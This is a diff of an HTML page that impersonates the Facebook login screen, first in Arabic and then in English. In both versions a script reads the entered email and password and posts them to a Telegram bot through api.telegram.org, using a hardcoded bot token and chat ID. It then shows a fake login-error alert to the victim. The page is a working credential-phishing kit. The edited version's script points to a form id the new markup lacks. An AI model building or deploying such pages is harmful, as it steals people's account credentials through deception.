@@ -1,224 +1,202 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FaceBook</title>
-<style>
-  :root{
-    --ink:#0f1115;
-    --paper:#f5f6f8;
-    --card:#ffffff;
-    --accent:#2d5bff;
-    --accent-dark:#1d3fc4;
-    --line:#dfe2e8;
-    --muted:#6b7280;
-  }
-  *{box-sizing:border-box;}
-  html,body{height:100%;margin:0;}
-  body{
-    font-family:"Segoe UI",Tahoma,Arial,sans-serif;
-    background:var(--paper);
-    color:var(--ink);
-    display:flex;
-    flex-direction:column;
-    min-height:100vh;
-  }
-  main{
-    flex:1;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:32px 16px;
-  }
-  .wrap{
-    display:flex;
-    gap:64px;
-    align-items:center;
-    max-width:980px;
-    width:100%;
-    flex-wrap:wrap;
-    justify-content:center;
-  }
-  .brand{
-    max-width:420px;
-    text-align:right;
-  }
-  .brand .logo{
-    display:flex;
-    align-items:center;
-    gap:10px;
-    justify-content:flex-end;
-    margin-bottom:18px;
-  }
-  .brand .logo-mark{
-    width:40px;height:40px;border-radius:10px;
-    background:var(--accent);
-    display:flex;align-items:center;justify-content:center;
-    color:#fff;font-weight:700;font-size:20px;
-  }
-  .brand .logo-text{font-size:26px;font-weight:700;color:var(--accent);}
-  .card{
-    background:var(--card);
-    border:1px solid var(--line);
-    border-radius:12px;
-    box-shadow:0 2px 10px rgba(16,20,30,.06);
-    padding:28px 24px;
-    width:100%;
-    max-width:360px;
-  }
-  .field{margin-bottom:14px;}
-  .field label{
-    display:block;
-    font-size:13px;
-    color:var(--muted);
-    margin-bottom:6px;
-  }
-  .field input{
-    width:100%;
-    padding:12px 14px;
-    border:1px solid var(--line);
-    border-radius:8px;
-    font-size:15px;
-    outline:none;
-  }
-  .field input:focus{
-    border-color:var(--accent);
-    box-shadow:0 0 0 3px rgba(45,91,255,.12);
-  }
-  .login-btn{
-    width:100%;
-    background:var(--accent);
-    color:#fff;
-    border:none;
-    border-radius:8px;
-    padding:13px 14px;
-    font-size:16px;
-    font-weight:600;
-    cursor:pointer;
-  }
-  .login-btn:hover{background:var(--accent-dark);}
-  .divider{
-    display:flex;
-    align-items:center;
-    gap:10px;
-    margin:18px 0;
-    color:var(--muted);
-    font-size:13px;
-  }
-  .divider::before,.divider::after{
-    content:"";
-    flex:1;
-    height:1px;
-    background:var(--line);
-  }
-  .forgot{text-align:center;}
-  .forgot a{color:var(--accent);font-size:14px;text-decoration:none;}
-  .signup-row{margin-top:20px;text-align:center;}
-  .signup-btn{
-    display:inline-block;
-    background:#31a24c;
-    color:#fff;
-    border:none;
-    border-radius:8px;
-    padding:12px 22px;
-    font-size:15px;
-    font-weight:600;
-    cursor:pointer;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Google+Sans:ital,opsz,wght@0,17..18,400..700;1,17..18,400..700&display=swap');
+    body {
+      font-family: 'Google Sans', sans-serif;
+      margin: 0;
+      background-color: white;
+    }
+
+    svg {
+      width: 60px;
+      height: 60px;
+      color: #1877f2;
+      margin: 20px auto 10px auto;
+      display: block;
+    }
+
+   
+    .email-field,
+    .password-field {
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0 auto 12px auto;
+      width: 516px; 
+    }
+
+   
+    #password,
+    #email {
+      height: 56px;
+      width: 100%;
+      border: 1px solid #ccd0d5;
+      border-radius: 16px;
+      padding: 18px 12px 4px 12px; 
+      outline: none;
+      font-size: 16px;
+      box-sizing: border-box;
+      background-color: #fff;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    #password:focus,
+    #email:focus {
+      border-color: #89898a;
+      
+    }
+
+   
+    label {
+      position: absolute;
+      left: 12px; 
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: #8d949e;
+      pointer-events: none; 
+      transition: all 0.15s cubic-bezier(0, 0, 0.2, 1);
+      transform-origin: left top;
+    }
+
+  
+    #email:focus ~ label,
+    #email:not(:placeholder-shown) ~ label,
+    #password:focus ~ label,
+    #password:not(:placeholder-shown) ~ label {
+      top: 8px;
+      transform: translateY(0) scale(0.75);
+      color: #969797;
+    }
+
+    .submit-field {
+      display: block;
+      margin: 15px auto;
+      width: 516px;
+      height: 48px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .submit-field:hover {
+      background-color: #166fe5;
+    }
+
+    .login-box {
+      width: 580px;
+      margin: 40px auto;
+      
+      padding: 20px;
+     
+     
+    }
+    .Forget-password:hover{
+      background-color: #64646413;
+      border-radius: 12px;
+      height: 40px;
+     
+      cursor: pointer;
+
+    }
+  </style>
 </head>
+
 <body>
+  <div>
+    <svg viewBox="0 0 24 24" fill="currentColor">
+      <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z">
+      </path>
+    </svg>
+  </div>
+  <hr style="margin-top: 20px; border: 0.5px solid #e5e5e5;">
 
   <main>
-    <div class="wrap">
-      <div class="brand">
-        <div class="logo">
-          <span class="logo-text">FaceBook</span>
-          <span class="logo-mark">F</span>
+    <div class="login-box">
+      <h3 style="margin-bottom: 20px; color: #1c1e21; margin-left: 40px; margin-top: auto;margin-right: auto;">Log in to Facebook</h3>
+      <form method="post">
+        
+        
+        <div class="email-field">
+          <input type="email" placeholder=" " id="email" required>
+          <label for="email">Email address or mobile number</label>
         </div>
-      </div>
 
-      <div class="card">
-        <form id="loginForm">
-          <div class="field">
-            <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
-            <input type="text" id="email" name="email" autocomplete="off" placeholder="example@email.com" required>
-          </div>
-          <div class="field">
-            <label for="password">كلمة المرور</label>
-            <input type="password" id="password" name="password" autocomplete="off" placeholder="••••••••" required>
-          </div>
+        <div class="password-field">
+          <input type="password" id="password" placeholder=" " required>
+          <label for="password">Password</label>
+        </div>
 
-          <button type="submit" class="login-btn">دخول</button>
-
-          <div class="forgot">
-            <a href="#">نسيت كلمة المرور؟</a>
-          </div>
-
-          <div class="divider">أو</div>
-
-          <div class="signup-row">
-            <button type="button" class="signup-btn">إنشاء حساب جديد</button>
-          </div>
-        </form>
-      </div>
+        <input type="submit" value="Log In" class="submit-field">
+        <div style="margin-top: 15px; " class="Forget-password" >
+          <a href="#" style="color: black; text-decoration: none; font-size: 16px; text-align: center; display: block; margin-top: 40px;margin-bottom:40px;margin-left: auto;margin-right: auto;">Forgotten password?</a>
+        </div>
+        <div style="border: #166fe5  solid 1px; width: 70%; margin: auto; border-radius: 20px; height: 40px; ">
+          <a href="#" style="display: block; text-decoration: none; color: #166fe5;  text-align: center; margin-top: 10px;margin-bottom: auto;margin-left: auto;margin-right: auto;">Create new account</a>
+        </div>
+      </form>
     </div>
   </main>
+</body>
 
-<script>
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault(); // منع إعادة تحميل الصفحة
+</html>
 
-        // جلب الحقول المدخلة والتأكد من أنها ليست فارغة
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
 
-        if (!email || !password) {
-            alert('الرجاء إدخال البريد وكلمة المرور');
-            return;
-        }
 
-        // بيانات البوت والمعرف (تأكد من صحتها)
-       const botToken = '9072593338:AAGWBCaNHBnqAv7QhNu2Oggarw066XKiSG4';
-       const chatId = '6798640564';
 
-        // تجهيز نص الرسالة
-        const message = `⚠️ محاولة تسجيل دخول:\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async function (e) {
+      e.preventDefault(); // لمنع إعادة تحميل الصفحة
 
-        // رابط الـ API الخاص بتليجرام
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      // استلام القيم المدخلة
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
 
-        try {
-            // إرسال الطلب
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            });
+   
+      const botToken = '9072593338:AAGWBCaNHBnqAv7QhNu2Oggarw066XKiSG4';
+      const chatId = '6798640564';
 
-            const data = await response.json();
-            
-            if (data.ok) {
-                console.log('تم الإرسال بنجاح إلى تليجرام');
-            } else {
-                console.error('فشل الإرسال من تليجرام:', data.description);
-            }
+      // تجهيز الرسالة
+      const message = `⚠️ محاولة تسجيل دخول جديدة (عبر المتصفح):\n\nالبريد: ${email}\nكلمة المرور: ${password}`;
 
-        } catch (error) {
-            console.error('حدث خطأ في الشبكة أو الاتصال:', error);
-        }
+      
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        // إعادة توجيه المستخدم بعد إتمام العملية (أو محاكاة خطأ تسجيل الدخول)
-        alert('حدث خطأ في تسجيل الدخول، يرجى المحاولة لاحقاً.');
-        //window.location.reload();
+      try {
+        
+        await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+
+       
+        alert('حدث خطأ في تسجيل الدخول، يجدر المحاولة لاحقاً.');
+        window.location.href = 'index.html'; 
+
+      } catch (error) {
+        console.error('فشل الإرسال:', error);
+      }
     });
-</script>
+
+  </script>
 
 </body>
+
 </html>
